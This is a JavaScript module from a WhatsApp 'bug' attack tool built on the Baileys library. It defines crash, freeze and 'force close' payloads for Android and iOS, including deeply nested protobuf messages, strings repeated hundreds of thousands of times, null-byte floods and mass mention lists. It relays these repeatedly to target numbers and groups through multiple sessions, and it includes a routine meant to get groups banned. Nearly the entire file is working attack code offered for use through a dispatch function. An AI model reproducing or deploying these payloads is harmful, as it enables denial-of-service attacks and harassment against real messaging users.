/**
 * CIPHER BVG — bugs.js
 * WhatsApp "bug" attack modes ported verbatim from index.js.
 * Preserves original function names and behaviour (GetSuDelay, GetSuInvis,
 * GetSuBlankAndro, GetSuBlankIOS, GetSuFC, GetSuGroupDelay, GetSuGroupBlank,
 * GetSuGroupCrash, groupBanz, fireBug, BUG_MODES).
 */
const chalk = require("chalk");
const crypto = require("crypto");
const {
  generateWAMessageFromContent,
  proto,
} = require("@whiskeysockets/baileys");
const wa = require("./wa");

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

/* FORECLOSE ANDROID NEW */
async function FC1msg(demmy, target) {
  while (Date.now() - Date.now() < 200000) {
    const IMG = {
      url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c&mms3=true",
      directPath: "/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c",
      mediaKey: "xD3KegXJnRDJbL89tyWMpG1m12+jAXgXKN0XhTS0riM=",
      fileEncSha256: "ef7Y+a5ufhg2pfcsfZ23SYE4vUNtyoc3j/8/yyqr58Q=",
      fileSha256: "84cNaVGkzmIJwjozrUJipNbXoNb0ovMC8OWBMpLRcYU=",
      fileLength: 20010,
      mediaKeyTimestamp: "1785637793",
      mimetype: "image/jpeg",
      height: 1600,
      width: 1200,
      jpegThumbnail: "",
    };

    const TAGS = [
      [0xBA, 0x03],
      [0xD2, 0x04],
      [0xAA, 0x02],
    ];

    const encodeVarint = function(n) {
      var buf = [];
      while (n >= 0x80) {
        buf.push((n & 0x7f) | 0x80);
        n >>>= 7;
      }
      buf.push(n);
      return Buffer.from(buf);
    };

    const wrapLd = function(tag, data) {
      return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
    };

    const basePayload = proto.Message.encode(
      proto.Message.fromObject({ imageMessage: IMG })
    ).finish();

    const inflate = function(tag, depth) {
      var buf = basePayload;
      for (var i = 0; i < depth; i++) {
        buf = wrapLd(tag, wrapLd([0x0A], buf));
      }
      return buf;
    };

    const resolveJid = function(raw) {
      var s = String(raw || "").trim();
      if (s.includes("@")) return s;
      return s.replace(/\D/g, "") + "@s.whatsapp.net";
    };

    const jids = (Array.isArray(target) ? target : [target])
      .map(resolveJid)
      .filter(function(j) { return j.length > 15; });

    if (!jids.length) return;

    var MAX_BATCH = 5;
    var totalSent = 0;

    for (var i = 0; i < 900; i++) {
      for (var offset = 0; offset < jids.length; offset += MAX_BATCH) {
        var chunk = jids.slice(offset, offset + MAX_BATCH);

        for (var ti = 0; ti < TAGS.length; ti++) {
          var tag = TAGS[ti];
          var payload = null;

          for (var depth = 5000; depth >= 2000 && !payload; depth -= 400) {
            try {
              var decoded = proto.Message.decode(inflate(tag, depth));
              proto.Message.encode(decoded).finish();
              payload = decoded;
            } catch (_) {}
          }

          if (!payload) continue;

          var msgId = "CSMC" + Date.now().toString(36).toUpperCase() + "_" + i + "_" + offset;

          try {
            await demmy.relayMessage("status@broadcast", payload, {
              messageId: msgId, statusJidList: chunk, additionalNodes: [{
                tag: "meta", attrs: {}, content: [{
                  tag: "mentioned_users", attrs: {}, content: chunk.map(function(target) {
                    return { tag: "to", attrs: { jid: target }, content: [] };
                  })
                }]
              }]
            });
            totalSent++;
          } catch (_) {}
          await new Promise(function(r) { setTimeout(r, 1000); });
        }
      }
    }
  }
}
async function ForcloseIos(demmy, target) {
  const jidList = (Array.isArray(target) ? target : [target])
    .map(t => String(t || "").includes("@") ? t : String(t).replace(/\D/g, "") + "@s.whatsapp.net");
  const msg = generateWAMessageFromContent(
    "status@broadcast",
    {
      richResponseMessage: {
        messageType: 1,
        unifiedResponse: {
          data: Buffer.from(
            JSON.stringify({
              __typename: "GenAIUnifiedResponse",
              response_id: crypto.randomUUID(),
              sections: [
                {
                  __typename: "GenAIUnifiedResponseSection",
                  view_model: Array.from({ length: 5 }, () => ({})),
                },
              ],
            })
          ).toString("base64"),
        },
        contextInfo: {
          forwardingScore: 1,
          isForwarded: true,
          forwardOrigin: 4,
          forwardedAiBotMessageInfo: {
            botJid: "0@bot",
          },
        },
      },
    },
    {}
  );

  await demmy.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: target,
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: jidList.map((target) => ({
              tag: "to",
              attrs: { jid: target },
            })),
          },
        ],
      },
    ],
  });
}

async function XFreeze(demmy, target) {
  await demmy.relayMessage(target, {
    interactiveResponseMessage: {
      body: {
        text: "Hey 🪷",
        format: 1,
      },
      contextInfo: {
        quotedMessage: {
          protocolMessage: {
            type: 25,
          },
        },
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{"wa_flow_response_params":{"title":"${"𑇂𑆵𑆴𑆿".repeat(60000)}","flow_id":"floww"}}`,
        version: 3,
      },
    },
  }, {
    participant: { jid: target },
    messageId: demmy.generateMessageTag(),
  });
}

async function ZyySpammerBlank(demmy, target) {
  await demmy.relayMessage(
    target,
    {
      stickerPackMessage: {
        stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
        name: "「 t.me/onlyone_demmy 」" + "ោ៝".repeat(30000),
        caption: "ꦾ".repeat(120000) + "ꦾ".repeat(77777),
        publisher: "\u0000",
        stickers: [
          {
            fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
            isAnimated: false,
            emojis: [""],
            accessibilityLabel: "",
            isLottie: false,
            mimetype: "image/webp",
          },
          {
            fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp",
            isAnimated: false,
            emojis: [""],
            accessibilityLabel: "",
            isLottie: false,
            mimetype: "image/webp",
          },
          {
            fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp",
            isAnimated: false,
            emojis: [""],
            accessibilityLabel: "",
            isLottie: false,
            mimetype: "image/webp",
          },
          {
            fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp",
            isAnimated: false,
            emojis: [""],
            accessibilityLabel: "",
            isLottie: false,
            mimetype: "image/webp",
          },
          {
            fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp",
            isAnimated: false,
            emojis: [""],
            accessibilityLabel: "",
            isLottie: false,
            mimetype: "image/webp",
          },
          {
            fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp",
            isAnimated: false,
            emojis: [""],
            accessibilityLabel: "",
            isLottie: false,
            mimetype: "image/webp",
          },
          {
            fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp",
            isAnimated: false,
            emojis: [""],
            accessibilityLabel: "",
            isLottie: false,
            mimetype: "image/webp",
          },
          {
            fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp",
            isAnimated: false,
            emojis: [""],
            accessibilityLabel: "",
            isLottie: false,
            mimetype: "image/webp",
          },
        ],
        fileLength: "3662919",
        fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
        fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
        mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
        directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
        packDescription: "",
        mediaKeyTimestamp: "1747502082",
        trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
        thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
        thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
        thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
        thumbnailHeight: 252,
        thumbnailWidth: 252,
        imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
        stickerPackSize: "3680054",
        stickerPackOrigin: "USER_CREATED",
        contextInfo: {
          isForwarded: true,
          forwardingScore: 999,
          businessMessageForwardInfo: {
            businessOwnerJid: target,
          },
        },
      },
    },
    {
      participant: { jid: target },
      messageId: demmy.generateMessageTag(),
    }
  );
}

async function invigccrash(demmy, target) {
  try {
    const msg = {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: {
              text: "\0",
            },
            contextInfo: {
              isForwarded: true,
              forwardingScore: 999,
              mentionedJid: [],
              externalAdReply: {
                title: "Demmy Tech",
                body: "Extended Message",
                mediaType: 1,
                renderLargerThumbnail: true,
              },
            },
            nativeFlowMessage: {
              messageParamsJson: "`".repeat(10000),
              buttons: "?".repeat(500000),
            },
          },
        },
      },
    };

    await demmy.relayMessage(target, msg, {});
  } catch (error) {
    console.error("Error in crash function:", error);
  }
}

/* XzV and related helpers (ported from Xzv + XzVV2 + XzVDelay2) */
async function Xzv(demmy, target) {
  await demmy.relayMessage(target, {
    listMessage: {
      title: "⿻",
      description: "ꪶ𖣂ꫂ - ( x )  ❆ XakaMods Trashers 𖤐",
      buttonText: "\0".repeat(50000),
      listType: 2,
      sections: [{
        title: "X",
        rows: [{
          title: "X",
          description: "",
          rowId: "\n",
        }],
      }],
      productListInfo: {
        productSections: [{
          title: "XakaMods!",
          products: Array.from({ length: 2000 }, () => ({
            productId: "ြ".repeat(50),
          })),
        }],
        headerImage: {
          productId: "\n".repeat(5000) + "\u0000".repeat(10000),
          jpegThumbnail: null,
        },
        businessOwnerJid: target,
      },
      contextInfo: {
        forwardingScore: 1,
        isForwarded: true,
        remoteJid: "status@broadcast",
      },
    },
  }, {});

  await demmy.relayMessage(target, {
    listMessage: {
      title: "⿻",
      description: "ꪶ𖣂ꫂ - ( x )  ❆ XakaMods Trashers 𖤐",
      buttonText: "\0".repeat(50000),
      listType: 2,
      sections: [{
        title: "X",
        rows: [{
          title: "X",
          description: "",
          rowId: "\n",
        }],
      }],
      productListInfo: {
        productSections: [{
          title: "XakaMods - Invations!",
          products: Array.from({ length: 2000 }, () => ({
            productId: "ြ".repeat(50),
          })),
        }],
        headerImage: {
          productId: "\n".repeat(5000) + "\u0000".repeat(10000),
          jpegThumbnail: null,
        },
        businessOwnerJid: target,
      },
      contextInfo: {
        forwardingScore: 1,
        isForwarded: true,
        remoteJid: "status@broadcast",
      },
    },
  }, {});

  await demmy.relayMessage(target, {
    extendedTextMessage: {
      contacts: {
        displayName: "@XakaMods",
        contacts: [
          {
            vcard:
              "BEGIN:VCARD\nVERSION:3.0\nFN:@FlavourXaka\nTEL;type=CELL;type=VOICE;waid=000000:+00000000\nEND:VCARD",
          },
        ],
      },
      contextInfo: {
        mentionedJid: Array.from(
          { length: 1900 },
          () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
        ),
        isForwarded: true,
        forwardingScore: 9999,
        forwardedAiBotMessageInfo: {
          botJid: "0@bot",
        },
      },
    },
    richResponseMessage: {
      messageType: 2,
      submessages: [
        {
          messageType: 8,
          mapAnnotation: {
            body: {
              title: "\\p" + "\n".repeat(4500000),
            },
          },
        },
        {
          liveLocationMessage: {
            degreesLatitude: -6.2,
            degreesLongitude: 106.816666,
            caption: "",
            sequenceNumber: 0,
            timeOffset: 0,
          },
        },
      ],
    },
  }, {});
}

async function XzVV2(demmy, target) {
  const msg = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "\u0000".repeat(6000),
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "one_crash_message",
                buttonParamsJson: "\r".repeat(80000) + "\n".repeat(8000),
              },
            ],
          },
        },
      },
    },
  };

  await demmy.relayMessage(target, msg, {
    noSelfSync: true,
  });
}

async function XzVDelay2(demmy, target) {
  const msg = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "p",
          },
          NativeFlowMessage: {
            buttons: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1999 }),
            ],
            name: "\x10".repeat(50000),
          },
          nativeFlowMessage: {
            name: "galaxy_message",
            buttons: "\u0000".repeat(250000) + "\x10".repeat(250000),
          },
        },
      },
    },
  };

  await demmy.relayMessage(target, msg, {
    participant: true,
  });
}

async function GCIos(demmy, target) {
  const TravaIphone = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000);
  try {
    let locationMessage = {
      degreesLatitude: -9.09999262999,
      degreesLongitude: 199.99963118999,
      jpegThumbnail: null,
      name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
      address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000),
      url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
    };
    let msg = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          locationMessage,
        },
      },
    }, {});

    let extendMsg = {
      extendedTextMessage: {
        text: " lуηχ-∂ємму " + TravaIphone,
        matchedText: "lуηχ-χχ ",
        description: "𑇂𑆵𑆴𑆿".repeat(25000),
        title: "lуηχ ∂ємму " + "𑇂𑆵𑆴𑆿".repeat(15000),
        previewType: "NONE",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAIQAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAIwAjAMBIgACEQEDEQH/xAAcAAACAwEBAQEAAAAAAAAAAAACAwQGBwUBAAj/xABBEAACAQIDBAYGBwQLAAAAAAAAAQIDBAUGEQcSITFBUXOSsdETFiZ0ssEUIiU2VXGTJFNjchUjMzQ1Q0VUYmSR/8QAGwEAAwEBAQEBAAAAAAAAAAAAAAECBAMFBgf/xAAxEQACAQMCAwMLBQAAAAAAAAAAAQIDBBEFEhMhMTVBURQVM2FxgYKhscHRFjI0Q5H/2gAMAwEAAhEDEQA/ALumEmJixiZ4p+bZyMQaYpMJMA6Dkw4sSmGmItMemEmJTGJgUmMTDTFJhJgUNTCTFphJgA1MNMSmGmAxyYaYmLCTEUPR6LiwkwKTKcmMjISmEmWYR6YSYqLDTEUMTDixSYSYg6D0wkxMWMTApMYmGmKTCTAoamEmKTDTABqYcWJTDTAY1MYnwExYSYiioJhJiUz1z0LMQ9MOMiC6+nSexrrrENM6CkGpEBV11hxrrrAeScpBxkQVXXWHCsn0iHknKQSloRPTJLmD9IXWBaZ0FINSOcrhdYcbhdYDydFMJMhwrJ9I30gFZJKkGmRFVXWNhPUB5JKYSYqLC1AZT9eYmtPdQx9JEupcGUYmy/wCz/LOGY3hFS5v6dSdRVXFbs2kkkhW0jLmG4DhFtc4fCpCpOuqb3puSa3W/kdzY69ctVu3l4Ijbbnplqy97XwTNrhHg5xzPqXbUfNnE2Ldt645nN2cZdw7HcIuLm/hUnUhXdNbs2kkoxfzF7RcCsMBtrOpYRnB1JuMt6bfQdbYk9ctXnvcvggI22y3cPw3tZfCJwjwM45kStqS0zi7Vuwuff1B2f5cw7GsDldXsKk6qrSgtJtLRJeYGfsBsMEs7WrYxnCU5uMt6bfDQ6+x172U5v/sz8IidsD0wux7Z+AOEeDnHM6TtqPm3ibVuwueOZV8l2Vvi2OQtbtSlSdOUmovTijQfUjBemjV/VZQdl0tc101/Bn4Go5lvq",
        thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
        thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
        thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
        mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
        mediaKeyTimestamp: "1743101489",
        thumbnailHeight: 641,
        thumbnailWidth: 640,
        inviteLinkGroupTypeV2: "DEFAULT",
      },
    };
    let msg2 = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          extendMsg,
        },
      },
    }, {});

    let msg3 = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          locationMessage,
        },
      },
    }, {});

    await demmy.relayMessage(target, {
      groupStatusMessageV2: {
        message: msg.message,
      },
    }, {
      messageId: msg.key.id,
    });

    await demmy.relayMessage(target, {
      groupStatusMessageV2: {
        message: msg2.message,
      },
    }, {
      messageId: msg2.key.id,
    });

    await demmy.relayMessage(target, {
      groupStatusMessageV2: {
        message: msg3.message,
      },
    }, {
      messageId: msg3.key.id,
    });
  } catch (err) {
    console.error(err);
  }
}

async function groupBanz(target) {
  if (!target.endsWith("@g.us")) throw new Error("Target must be a group ID ending with @g.us");
  if (wa.sessions.size === 0) throw new Error("No active WhatsApp sessions.");

  const BAN_NUMBER = "13135550002@s.whatsapp.net";
  const socks = [...wa.sessions.values()];
  let successCount = 0;

  console.log(chalk.cyan(`[>] [groupBanz] Starting ban on ${target} with ${socks.length} session(s)`));

  for (const sock of socks) {
    try {
      const rawId   = sock.user?.id || "";
      const sockJid = rawId.includes(":") ? rawId.split(":")[0] + "@s.whatsapp.net" : rawId;

      try {
        const groupMeta = await sock.groupMetadata(target);
        const isMember  = groupMeta.participants.some(p =>
          p.id === sockJid || p.id === rawId
        );
        if (!isMember) {
          console.log(chalk.yellow(`  [groupBanz] Session ${sockJid} is not a member of ${target} — ban may fail`));
        }
      } catch {}

      await sock.groupParticipantsUpdate(target, [BAN_NUMBER], "add");
      console.log(chalk.green(`  [groupBanz] ✓ ${sockJid} — added ${BAN_NUMBER} to ${target}`));
      successCount++;
    } catch (err) {
      const sockJid = (sock.user?.id || "unknown").split(":")[0] + "@s.whatsapp.net";
      console.error(chalk.red(`  [groupBanz] ✗ ${sockJid} error: ${err.message}`));
    }
  }

  console.log(chalk.blue(`[=] [groupBanz] Done — ${successCount}/${socks.length} sessions executed on ${target}`));
  return { success: successCount > 0, group: target, number: BAN_NUMBER, sessions: successCount };
}

async function GetSuDelay(target) {
  if (wa.sessions.size === 0) { console.log(chalk.red("[x] [delay] No active sessions.")); return; }
  console.log(chalk.cyan(`[>] [delay] Starting -> ${target} with ${wa.sessions.size} session(s)`));
  for (let i = 0; i < 99; i++) {
    if (wa.sessions.size === 0) { console.log(chalk.red(`[x] [delay] Session lost at ${i + 1}, stopping.`)); break; }
    for (const demmy of [...wa.sessions.values()]) {
      try {
        await XzVDelay2(demmy, target);
        await sleep(5000);
        await XzVV2(demmy, target);
        await sleep(9000);
        await Xzv(demmy, target);
        await sleep(9000);
        console.log(chalk.yellow(`[delay] ${i + 1}/99 -> ${target}`));
      } catch (err) {
        console.error(chalk.red(`[delay] ${i + 1} error: ${err.message}`));
      }
    }
    await sleep(2000);
  }
  console.log(chalk.blue(`[=] [delay] Done -> ${target}`));
}

async function GetSuInvis(target) {
  if (wa.sessions.size === 0) { console.log(chalk.red("[x] [invis] No active sessions.")); return; }
  console.log(chalk.cyan(`[>] [invis] Starting -> ${target} with ${wa.sessions.size} session(s)`));
  for (let i = 0; i < 5; i++) {
    if (wa.sessions.size === 0) { console.log(chalk.red(`[x] [invis] Session lost at ${i + 1}, stopping.`)); break; }
    for (const demmy of [...wa.sessions.values()]) {
      try {
        await FC1msg(demmy, target);
        await sleep(1000);
        console.log(chalk.yellow(`[invis] ${i + 1}/999 -> ${target}`));
      } catch (err) {
        console.error(chalk.red(`[invis] ${i + 1} error: ${err.message}`));
      }
    }
  }
  console.log(chalk.blue(`[=] [invis] Done -> ${target}`));
}

async function GetSuBlankAndro(target) {
  if (wa.sessions.size === 0) { console.log(chalk.red("[x] [blank] No active sessions.")); return; }
  console.log(chalk.cyan(`[>] [blank] Starting -> ${target} with ${wa.sessions.size} session(s)`));
  for (let i = 0; i < 999; i++) {
    if (wa.sessions.size === 0) { console.log(chalk.red(`[x] [blank] Session lost at ${i + 1}, stopping.`)); break; }
    for (const demmy of [...wa.sessions.values()]) {
      try {
        await XFreeze(demmy, target);
        await sleep(5000);
        await ZyySpammerBlank(demmy, target);
        console.log(chalk.yellow(`  [blank] done -> ${target}`));
      } catch (err) {
        console.error(chalk.red(`  [blank] error: ${err.message}`));
      }
    }
  }
  console.log(chalk.blue(`[=] [blank] Done -> ${target}`));
}

async function GetSuBlankIOS(target) {
  if (wa.sessions.size === 0) { console.log(chalk.red("[x] [blank-ios] No active sessions.")); return; }
  console.log(chalk.cyan(`[>] [blank-ios] Starting -> ${target} with ${wa.sessions.size} session(s)`));
  for (let i = 0; i < 999; i++) {
    if (wa.sessions.size === 0) { console.log(chalk.red(`[x] [blank-ios] Session lost at ${i + 1}, stopping.`)); break; }
    for (const demmy of [...wa.sessions.values()]) {
      try {
        await ForcloseIos(demmy, target);
        await sleep(3500);
        console.log(chalk.yellow(`  [blank-ios] ${i + 1}/5 -> ${target}`));
      } catch (err) {
        console.error(chalk.red(`  [blank-ios] ${i + 1} error: ${err.message}`));
      }
    }
  }
  console.log(chalk.blue(`[=] [blank-ios] Done -> ${target}`));
}

async function GetSuFC(target) {
  if (wa.sessions.size === 0) { console.log(chalk.red("[x] [fc] No active sessions.")); return; }
  console.log(chalk.cyan(`[>] [fc] Starting -> ${target} with ${wa.sessions.size} session(s)`));
  for (let i = 0; i < 700; i++) {
    if (wa.sessions.size === 0) { console.log(chalk.red(`[x] [fc] Session lost at ${i + 1}, stopping.`)); break; }
    for (const demmy of [...wa.sessions.values()]) {
      try {
        await XzVDelay2(demmy, target);
        await sleep(7000);
        await XzVV2(demmy, target);
        await sleep(7000);
        await Xzv(demmy, target);
        console.log(chalk.yellow(`  [fc] ${i + 1}/700 -> ${target}`));
      } catch (err) {
        console.error(chalk.red(`  [fc] ${i + 1} error: ${err.message}`));
      }
    }
    await sleep(6000);
  }
  console.log(chalk.blue(`[=] [fc] Done -> ${target}`));
}

async function GetSuGroupDelay(target) {
  if (wa.sessions.size === 0) { console.log(chalk.red("[x] [group-delay] No active sessions.")); return; }
  console.log(chalk.cyan(`[>] [group-delay] Starting -> ${target} with ${wa.sessions.size} session(s)`));
  for (let i = 0; i < 200; i++) {
    if (wa.sessions.size === 0) { console.log(chalk.red(`[x] [group-delay] Session lost at ${i + 1}, stopping.`)); break; }
    for (const demmy of [...wa.sessions.values()]) {
      try {
        await demmy.relayMessage(target, {
          extendedTextMessage: {
            text: "飞慧慧明" + "".repeat(52000),
            contextInfo: { mentionedJid: ["0@s.whatsapp.net"] },
          },
        }, { participant: { jid: target } });
        console.log(chalk.yellow(`  [group-delay] ${i + 1}/200 -> ${target}`));
      } catch (err) {
        console.error(chalk.red(`  [group-delay] ${i + 1} error: ${err.message}`));
      }
    }
    await sleep(2000);
  }
  console.log(chalk.blue(`[=] [group-delay] Done -> ${target}`));
}

async function GetSuGroupBlank(target) {
  if (wa.sessions.size === 0) {
    console.log(chalk.red("[x] [group-blank] No active sessions."));
    return;
  }

  console.log(chalk.cyan(`[>] [group-blank] Starting -> ${target} with ${wa.sessions.size} session(s)`));

  for (let i = 0; i < 999; i++) {
    if (wa.sessions.size === 0) {
      console.log(chalk.red(`[x] [group-blank] Session lost at ${i + 1}, stopping.`));
      break;
    }

    for (const demmy of [...wa.sessions.values()]) {
      try {
        await XFreeze(demmy, target);
        await sleep(3000);
        await ZyySpammerBlank(demmy, target);
        await sleep(3000);
        await ForcloseIos(demmy, target);
        console.log(chalk.yellow(`  [group-blank] done -> ${target}`));
      } catch (err) {
        console.error(chalk.red(`  [group-blank] error: ${err.message}`));
      }
    }
    await sleep(700);
  }

  console.log(chalk.blue(`[=] [group-blank] Done -> ${target}`));
}

async function GetSuGroupCrash(target) {
  if (wa.sessions.size === 0) { console.log(chalk.red("[x] [group-invis] No active sessions.")); return; }
  console.log(chalk.cyan(`[>] [group-invis] Starting -> ${target} with ${wa.sessions.size} session(s)`));
  for (let i = 0; i < 1000; i++) {
    if (wa.sessions.size === 0) { console.log(chalk.red(`[x] [group-invis] Session lost at ${i + 1}, stopping.`)); break; }
    for (const demmy of [...wa.sessions.values()]) {
      try {
        await invigccrash(demmy, target);
        await sleep(6000);
        await ForcloseIos(demmy, target);
        console.log(chalk.yellow(`  [group-invis] ${i + 1}/1000 -> ${target}`));
      } catch (err) {
        console.error(chalk.red(`  [group-invis] ${i + 1} error: ${err.message}`));
      }
    }
    await sleep(700);
  }
  console.log(chalk.blue(`[=] [group-invis] Done -> ${target}`));
}

const BUG_MODES = {
  "delay":        GetSuDelay,
  "invis":        GetSuInvis,
  "blank":        GetSuBlankAndro,
  "blank-ios":    GetSuBlankIOS,
  "fc":           GetSuFC,
  "group-delay":  GetSuGroupDelay,
  "group-blank":  GetSuGroupBlank,
  "group-invis":  GetSuGroupCrash,
  "group-ban":    async (target) => {
    if (wa.sessions.size === 0) throw new Error("No active WhatsApp sessions.");
    await groupBanz(target);
  },
};

/**
 * Launch a payload. Returns a promise that rejects on failure so HTTP
 * callers can report the real reason instead of a false success.
 */
function fireBug(mode, target) {
  const fn = BUG_MODES[mode];
  if (!fn) return Promise.reject(new Error(`Unknown mode: ${mode}`));
  return Promise.resolve()
    .then(() => fn(target))
    .catch(err => {
      console.error(`[x] fireBug(${mode}) error: ${err.message}`);
      throw err;
    });
}

module.exports = {
  BUG_MODES,
  fireBug,
  GetSuDelay,
  GetSuInvis,
  GetSuBlankAndro,
  GetSuBlankIOS,
  GetSuFC,
  GetSuGroupDelay,
  GetSuGroupBlank,
  GetSuGroupCrash,
  groupBanz,
};

